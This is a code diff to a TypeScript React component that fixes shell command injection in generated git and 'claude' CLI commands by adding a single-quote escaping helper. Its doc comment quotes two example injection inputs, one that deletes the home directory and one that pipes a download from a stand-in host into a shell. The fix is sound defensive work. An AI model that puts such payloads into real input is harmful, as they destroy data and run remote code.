@@ -40,6 +40,17 @@ const buttonStyle: React.CSSProperties = {
   fontSize: '0.75rem',
 };
 
+/**
+ * POSIX shell single-quote escaping. Inside '...' nothing is special except the
+ * closing quote, which is emitted as '"'"' (close, literal quote, reopen).
+ * This replaces the old `.replace(/"/g, '\\"')` approach, which escaped
+ * double quotes but not backslashes or `$`, so input such as `\"; rm -rf ~ #`
+ * or `$(curl evil.sh | sh)` could break out of the generated command.
+ */
+export function shellQuote(value: string): string {
+  return `'${value.split("'").join(`'"'"'`)}'`;
+}
+
 function parseRepoSlug(url: string): string | null {
   const m = url.match(/github\.com[:/]([^/]+)\/([^/.]+)(?:\.git)?/);
   if (!m) return null;
@@ -54,15 +65,18 @@ function buildClaudeCommand(
   const slug = parseRepoSlug(repo.repoUrl);
   const cloneDir = slug ? slug.split('/')[1] : 'repo';
   const target = repo.localPath
-    ? `cd ${JSON.stringify(repo.localPath)} && git pull`
+    ? `cd ${shellQuote(repo.localPath)} && git pull`
     : slug
-    ? `gh repo clone ${slug} && cd ${cloneDir}`
-    : `git clone ${JSON.stringify(repo.repoUrl)} && cd ${cloneDir}`;
+    ? `gh repo clone ${shellQuote(slug)} && cd ${shellQuote(cloneDir)}`
+    : `git clone ${shellQuote(repo.repoUrl)} && cd ${shellQuote(cloneDir)}`;
 
-  const branchStep = repo.branch ? ` && git checkout ${JSON.stringify(repo.branch)}` : '';
-  const context = `Context: ControlHub task "${taskTitle.replace(/"/g, '\\"')}"`;
+  const branchStep = repo.branch ? ` && git checkout ${shellQuote(repo.branch)}` : '';
+  // JSON.stringify fully escapes quotes *and* backslashes in the title.
+  const context = `Context: ControlHub task ${JSON.stringify(taskTitle)}`;
   const prompt = `${context}\n\nInstruction: ${instruction}\n\nWhen finished, commit with a clear message and push.`;
-  return `${target}${branchStep} && claude "${prompt.replace(/"/g, '\\"').replace(/\n/g, '\\n')}"`;
+  // Single-quote the whole prompt so the shell performs no expansion
+  // ($(...), `...`, $VAR, backslashes) on user-controlled task text.
+  return `${target}${branchStep} && claude ${shellQuote(prompt)}`;
 }
 
 export function TaskRepoSection({ taskId, taskTitle, taskDescription }: TaskRepoSectionProps) {
